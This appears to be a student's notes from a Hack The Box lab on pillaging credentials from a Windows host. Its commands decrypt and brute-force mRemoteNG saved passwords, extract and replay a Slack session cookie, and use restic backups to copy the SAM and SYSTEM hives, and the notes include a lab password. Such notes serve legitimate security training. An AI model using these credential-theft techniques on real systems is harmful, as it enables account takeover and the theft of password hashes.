...
![Network diagram showing connections: Pentester to Windows Server, which connects to a Router. Router links to two Switches, File Server, and Backup Servers. Switches connect to Domain Controller and Database Servers. Printer connected to Windows Server.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/network.png)
...
```shell-session
xF1NN@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
...
```shell-session
xF1NN@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
...
```shell-session
xF1NN@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
...
```shell-session
xF1NN@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
...
```shell-session
xF1NN@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
...
![Slack page in Firefox Private Browsing. Message: 'Welcome back'. Workspace for plaintexthackthebox@gmail.com listed as 'Inlanefreight' with 2 members. 'Launch Slack' button visible.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/cookie-access.jpg)
...
![Slack sign-in page for Inlanefreight with options to sign in using Google or Apple. Email and password fields visible. Cookie Editor open, showing cookie 'd' with a long value.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/replace-cookie2.jpg)
...
![Slack search results for 'creds' in Inlanefreight workspace. Messages from plaintexthackthebox in #general channel: 'Hello José, I'll give you the creds you need.' and 'I'll better send you the creds over here.'](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/search-creds-slack.jpg)
...
---
Jeff pw: Webmaster001!

restored SAM backup -- 

PS C:\WINDOWS\system32> restic.exe -r E:\restic2\ backup C:\Windows\System32\config\SAM --use-fs-snapshot
repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
...
Added to the repo: 65.456 KiB

processed 1 files, 64.000 KiB in 0:02
snapshot 7d4fd413 saved
PS C:\WINDOWS\system32> restic.exe -r E:\restic2\ snapshots
repository fdb2e6dd opened successfully, password is correct

9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
e624c91b  2026-01-15 13:22:02  PILLAGING-WIN01              C:\Windows\System32\config

PS C:\WINDOWS\system32> restic.exe -r E:\restic2\ restore 7d4fd413 --target C:\SAM
repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 7d4fd413 of [C:\Windows\System32\config\SAM] at 2026-01-15 13:27:40.5547473 -0800 PST by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\SAM

Did the same thing for SYSTEM